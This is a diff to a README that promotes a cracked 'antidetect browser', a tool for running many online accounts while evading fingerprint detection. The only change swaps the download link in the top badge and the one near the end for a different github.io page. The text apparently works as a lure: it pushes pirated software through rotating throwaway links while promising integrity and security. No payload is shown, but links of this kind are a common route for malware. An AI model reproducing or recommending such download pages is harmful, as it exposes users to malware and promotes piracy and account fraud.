@@ -2,7 +2,7 @@
 
 Antidetect Browser Crack is a powerful software solution designed for users who need to manage multiple online accounts while maintaining privacy and avoiding detection. This tool provides a comprehensive suite of features for advanced fingerprint customization, making it ideal for digital marketers, affiliate managers, and privacy-conscious individuals. With its intuitive interface and robust performance, Antidetect Browser Crack helps streamline workflows and enhance online anonymity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -67,7 +67,7 @@ A limited trial version may be available for testing basic features. However, fo
 
 Access the latest version of Antidetect Browser Crack through the link below. We recommend always using the most recent update for new features and security improvements.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 For direct download, you can also use the badge at the top of this page. Ensure you verify the file integrity after download for a secure installation experience.
 
